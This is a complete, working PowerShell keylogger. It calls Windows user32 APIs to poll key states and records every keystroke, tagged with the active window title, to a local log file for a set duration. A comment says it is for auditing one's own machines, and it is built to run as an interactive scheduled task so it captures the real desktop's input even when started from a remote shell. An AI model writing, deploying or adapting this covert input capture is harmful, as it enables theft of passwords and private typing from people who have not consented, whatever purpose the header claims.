<# Capture pressed keys as plain ASCII text for a limited time
   (testing/auditing OWN machines). Runs via interactive scheduled task
   (/IT) so it sees the real desktop input; WinRM shells (session 0)
   cannot observe keystrokes.
   Params: -Seconds (capture duration), -Out (log file), -Done (flag file).
   Letters follow Shift state (a/A); Enter writes a newline; Tab writes
   a tab; other non-printable keys are skipped. #>
param([int]$Seconds = 300, [string]$Out = 'C:\Temp\keys.log', [string]$Done = 'C:\Temp\keys.done')
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class K {
  [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
  [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
}
'@
function Get-ActiveTitle {
  $h = [K]::GetForegroundWindow()
  $sb = New-Object Text.StringBuilder 256
  if ([K]::GetWindowText($h, $sb, 256) -gt 0) { return $sb.ToString() }
  return '?'
}
$punct = @{186=';';187='=';188=',';189='-';190='.';191='/';219='[';220='\';221=']';222="'";226='\'}
Remove-Item $Out -Force -ErrorAction SilentlyContinue
Remove-Item $Done -Force -ErrorAction SilentlyContinue
'' | Out-File $Out -Encoding ascii -NoNewline
$end = (Get-Date).AddSeconds($Seconds)
$down = @{}
$lastTitle = ''
while ((Get-Date) -lt $end) {
  $title = Get-ActiveTitle
  if ($title -ne $lastTitle) {
    $lastTitle = $title
    Add-Content $Out ("`r`n[" + $title + "]`r`n") -NoNewline -Encoding ascii
  }
  $shift = (([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0)
  for ($vk = 8; $vk -le 255; $vk++) {
    try { $st = [K]::GetAsyncKeyState($vk) } catch { continue }
    $isDown = ($st -band 0x8000) -ne 0
    if ($isDown -and -not $down.ContainsKey($vk)) {
      $down[$vk] = $true
      $ch = $null
      if ($vk -eq 13) { $ch = [char]13; $ch += [char]10 }
      elseif ($vk -eq 9) { $ch = [char]9 }
      elseif ($vk -eq 192) { $ch = [char]96 }
      elseif ($vk -eq 32) { $ch = ' ' }
      elseif ($vk -ge 65 -and $vk -le 90) {
        $ch = [char]($vk + 32)
        if ($shift) { $ch = [char]$vk }
      }
      elseif ($vk -ge 48 -and $vk -le 57) { $ch = [char]$vk }
      elseif ($punct.ContainsKey($vk)) { $ch = $punct[$vk] }
      if ($null -ne $ch) { Add-Content $Out $ch -NoNewline -Encoding ascii }
    } elseif (-not $isDown -and $down.ContainsKey($vk)) {
      $down.Remove($vk)
    }
  }
  Start-Sleep -Milliseconds 50
}
'done' | Out-File $Done -Encoding ascii
'CAPTURED to ' + $Out
